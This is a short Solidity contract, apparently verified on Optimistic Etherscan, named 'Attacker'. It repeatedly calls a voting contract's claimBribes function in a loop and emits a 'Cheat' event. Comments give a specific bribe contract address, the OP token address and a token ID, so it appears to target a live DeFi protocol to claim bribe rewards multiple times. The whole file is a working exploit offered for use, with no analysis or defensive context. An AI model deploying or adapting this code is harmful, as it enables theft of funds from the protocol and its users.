/**
 *Submitted for verification at Optimistic.Etherscan.io on 2023-01-14
*/

// File: contracts/bribes.sol



pragma solidity >= 0.8.7;

interface IVoter {
    function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint _tokenId) external;
}

contract Attacker {
    IVoter public _voter;
    
    constructor(
        IVoter _vot
    ) {
        _voter = _vot;
    }

    event Cheat(address[] bribes, uint tokenId);

    // BRIBES ADDRESS: 0x9120B806D33920f2fCBDA28197D781111a2E2289 LUSD / WETH
    // TOKEN OP : 0x4200000000000000000000000000000000000042
    // TOKEN ID : 15018

    function exec(address[] memory _bribes, address[][] memory _tokens, uint _tokenId, uint _inLoop) external {
        for (uint i=0; i<=_inLoop; i++) {
            _voter.claimBribes(_bribes, _tokens, _tokenId);
        }
        emit Cheat(_bribes, _tokenId);
    }
}